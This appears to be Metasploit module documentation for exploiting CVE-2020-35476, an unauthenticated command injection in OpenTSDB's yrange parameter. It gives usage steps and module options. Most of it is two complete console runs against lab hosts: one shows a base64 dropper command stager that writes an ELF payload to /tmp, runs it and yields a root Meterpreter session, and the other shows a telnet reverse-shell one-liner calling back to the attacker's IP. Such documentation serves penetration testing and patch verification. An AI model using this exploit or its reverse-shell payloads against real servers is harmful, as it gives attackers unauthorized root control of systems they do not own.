## Vulnerable Application
This module exploits an unauthenticated command injection vulnerability in the yrange parameter
in OpenTSDB through 2.4.0 (CVE-2020-35476) in order to achieve unauthenticated remote code execution as the root user.

The module first attempts to obtain the OpenTSDB version via the api. If the version is 2.4.0 or lower,
the module performs additional checks to obtain the configured metrics and aggregators.
It then randomly selects one metric and one aggregator and uses those to instruct the target server to plot a graph.
As part of this request, the yrange parameter is set to the payload, which will then be executed by the target if the latter is vulnerable.

This module has been successfully tested against OpenTSDB version 2.3.0.

## Installation Information
OpenTSDB is open source software. Vulnerable releases are available [here](https://github.com/OpenTSDB/opentsdb/releases).
Documentation and installation instructions are available [here](http://opentsdb.net/docs/build/html/index.html).

## Verification Steps
1. Start msfconsole
2. Do: `use exploit/linux/http/opentsdb_yrange_cmd_injection`
3. Do: `set RHOSTS [IP]`
4. Do: `set LHOST [IP]`
5. Do: `set SRVHOST [IP]`
6. Do: `exploit`

## Options
### TARGETURI
The base path to OpenTSDB. The default value is `/`.

## Targets
```
Id  Name
--  ----
0   Automatic (Unix In-Memory)
1   Automatic (Linux Dropper)
```

## Scenarios
### OpenTSDB 2.3.0 - Linux target
```
msf6 exploit(linux/http/opentsdb_yrange_cmd_injection) > options

Module options (exploit/linux/http/opentsdb_yrange_cmd_injection):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.1.1        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      4242             yes       The target port (TCP)
   SRVHOST    10.10.1.30       yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0
                                         .0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The base path to OpenTSDB
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.1.30       yes       The listen address (an interface may be specified)
   LPORT  1312             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Automatic (Linux Dropper)


msf6 exploit(linux/http/opentsdb_yrange_cmd_injection) > run

[*] Started reverse TCP handler on 10.10.1.30:1312
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The target is OpenTSDB version 2.3.0
[*] Identified 25 configured metrics. Using metric MessagePrePublishingEvents.min
[*] Identified 31 configured aggregators. Using aggregator sum
[*] Generated command stager: ["echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1toCgoHJWgCAAUgieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZsmqwA82AhcB4Av/huAEAAAC7AQAAAM2A>>'/tmp/XeJKe.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (which openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2> /dev/null > '/tmp/JIulg' < '/tmp/XeJKe.b64' ; chmod +x '/tmp/JIulg' ; '/tmp/JIulg' & sleep 2 ; rm -f '/tmp/JIulg' ; rm -f '/tmp/XeJKe.b64'"]
[*] Transmitting intermediate stager...(106 bytes)
[*] Sending stage (1017704 bytes) to 10.10.1.1
[*] Command Stager progress - 100.00% done (773/773 bytes)
[*] Meterpreter session 4 opened (10.10.1.30:1312 -> 10.10.1.1:47720) at 2022-11-24 19:27:06 +0000

meterpreter > getuid
Server username: root
```

### OpenTSDB 2.3.0 - Unix target
```
msf6 exploit(linux/http/opentsdb_yrange_cmd_injection) > options

Module options (exploit/linux/http/opentsdb_yrange_cmd_injection):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.1.1        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      4242             yes       The target port (TCP)
   SRVHOST    10.10.1.30       yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0
                                         .0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The base path to OpenTSDB
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.1.30       yes       The listen address (an interface may be specified)
   LPORT  1337             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)


msf6 exploit(linux/http/opentsdb_yrange_cmd_injection) > run

[+] sh -c '(sleep 3851|telnet 10.10.1.30 1337|while : ; do sh && break; done 2>&1|telnet 10.10.1.30 1337 >/dev/null 2>&1 &)'
[*] Started reverse TCP double handler on 10.10.1.30:1337
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The target is OpenTSDB version 2.3.0
[*] Identified 25 configured metrics. Using metric MessagePrePublishingEvents.mean_rate
[*] Identified 31 configured aggregators. Using aggregator max
[*] Executing the payload
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo q08IVzJKPKz8soea;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "q08IVzJKPKz8soea\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 3 opened (10.10.1.30:1337 -> 10.10.1.1:52370) at 2022-11-24 19:24:06 +0000

id
uid=0(root) gid=0(root) groups=0(root)
```
